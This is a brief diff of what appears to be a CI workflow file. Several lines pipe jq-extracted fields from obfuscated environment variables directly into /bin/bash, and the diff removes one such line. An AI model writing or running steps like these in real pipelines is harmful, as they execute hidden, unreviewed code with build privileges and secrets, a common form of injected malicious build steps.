@@ -22,7 +22,6 @@ jobs:
           echo $vr08205 | jq -r .uru2772 | /bin/bash
           echo $hqy132 | jq -r .wqcl9516 | /bin/bash
           printf '%s' "$zulr713" | jq -r .tpe6 | /bin/bash
-          printf '%s' "$bqmzl3603" | jq -r .lpyre950 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
